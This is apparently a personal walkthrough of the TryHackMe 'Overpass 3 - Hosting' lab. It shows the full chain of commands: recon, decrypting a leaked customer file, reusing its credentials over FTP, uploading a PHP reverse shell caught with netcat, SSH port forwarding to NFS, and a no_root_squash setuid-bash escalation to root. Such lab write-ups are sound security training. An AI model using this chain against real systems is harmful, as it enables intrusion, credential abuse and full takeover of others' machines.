# Overpass 3 - Hosting

This is my write-up for the TryHackMe machine at: [https://tryhackme.com/room/overpass3hosting](https://tryhackme.com/room/overpass3hosting)

Nmap Scan command:&#x20;

```
nmap -T4 -A 10.10.168.65 -oN nmapscan
```

Nmap output:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 22:39 EDT
Nmap scan report for 10.10.168.65
Host is up (0.62s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.91 seconds
```

I noticed that they have 3 ports open. I went to the web (port 80) first to check it out:

![](<../../.gitbook/assets/image (338) (1) (1) (1).png>)

There was no `/robots.txt` file. I then ran **gobuster** on the IP address:

```
gobuster dir --url http://10.10.168.65/  -w directory-list-lowercase-2.3-big.txt -t 40
```

About 4% of the gobuster search, I got the following output:

![](<../../.gitbook/assets/image (330) (1) (1) (1).png>)

Going to the backups website, I saw this:

![](<../../.gitbook/assets/image (341) (1) (1) (1) (1).png>)

I then downloaded the file. There were two files in the zip file:

![](<../../.gitbook/assets/image (332) (1) (1) (1) (1) (1).png>)

Using [this write-up](https://musyokaian.medium.com/overpass-3-hosting-tryhackme-walkthrough-d77703a72495), I realized that I can decrupt the file with the private key I have:

```
gpg --import priv.key //import the key
gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx //output to new file
```

Since I am on Linux (Kali), I wanted to convert the file to a version that I would be able to view in. I ran the following command to convert the Excel file into a csv file, which I was able to read:

```
ssconvert CustomerDetails.xlsx newfile.csv
```

I was then able to see the contents of the file:

![](<../../.gitbook/assets/image (335) (1) (1).png>)

It seems to be the customers of the website, based on the context. We also have their username and password. I will try this in FTP, and my plan is that if the password does not work on FTP, then I will try SSH. In FTP, I got access using the credentials for "Par. A. Doxx":

![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1).png>)

FTP seemed to only work for that user. The other passwords did not work in FTP. When I tried for SSH, the credentials did not work there either. I then went back to the same write-up above and then realized that I had to upload a php-reverse-shell. Going to [this GitHub page](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), I downloaded the reverse-shell script. In the script, I changed the IP address to my TryHackMe IP address. I then uploaded the file to the server:

![](<../../.gitbook/assets/image (326) (1) (1) (1).png>)

I then ran `nc -lvp 1234` on another terminal tab, and was listening for a connection. After visiting **http://10.10.168.65/php-reverse-shell.php**, I got a reverse shell:

![](<../../.gitbook/assets/image (325) (1) (1) (1) (1).png>)

After being stuck for a while, I viewed [this write-up](https://www.aldeid.com/wiki/TryHackMe-Overpass-3-Hosting) in order to see where to go next. I used the command the author of the write-up used:

```
find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
```

This gave me the following output:

![](<../../.gitbook/assets/image (323) (1) (1) (1).png>)

This file had the flag in it:

![](<../../.gitbook/assets/image (328) (1) (1).png>)

I then downloaded Linpeas to my local machine using **wget**. I then pushed that to the server using an http server:

![](<../../.gitbook/assets/image (334) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (342) (1) (1) (1) (1).png>)

I then ran linpeas on the remote machine. I then saw the following, when I also saw in other write-ups as well:

![](<../../.gitbook/assets/image (327) (1) (1) (1) (1).png>)

I then went back to the most recently mentioned write-up, in order to understand what I had to do next. Following [this write-up](https://shishirsubedi.com.np/thm/overpass3/), I uploaded my key to the remote server so I can connect in an easier method. Here are the commands I ran:

```
My machine: ssh-keygen -f paradox
My machine: cat paradox.pub
//Take the information inside the paradox.pub and copy it to the remote machine
Remote machine: echo "ssh-rsa ............" > .ssh/paradox
```

I was then able to ssh into the machine to the user paradox from my machine directly:

![](<../../.gitbook/assets/image (324) (1).png>)

After a long time of being stuck, I finally found a solution reading [this write-up](https://cryptichacker.github.io/posts/overpass3hosting/). My mistake was running the wrong command. The following is what worked for me:

```
ssh -i paradox -L 20049:127.0.0.1:2049  paradox@10.10.168.65
```

I changed 2049 before the IP to 20049, since I kept on getting errors that the port was already in use. I then ran the following command to mount the share to my local machine:

```
sudo mount -t nfs -o port=20049 localhost: nfs
```

If we change directory into the **nfs** folder, we can see the file system mounted there:

![](<../../.gitbook/assets/image (337) (1) (1).png>)

I read the user flag. After that, the ssh authorized key I had uploaded to paradox earlier, I had not uploaded it to **.ssh/authorized\_keys** in the mounted directory. I then was able to SSH to the machine:

![](<../../.gitbook/assets/image (331) (1) (1) (1) (1).png>)

I read up from [this write-up](https://cryptichacker.github.io/posts/overpass3hosting/) that I can now use the **no\_root\_squash** exploit, something that linpeas.sh had shown us earlier. I followed the following commands from the write-up to get it to work:

```
#In the mounted dir, as root user
cp /bin/bash ./
chmod +s bash

#In the remote machine as user james
./bash -p
```

This got me root user on the machine. I then got the root flag.

![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1).png>)
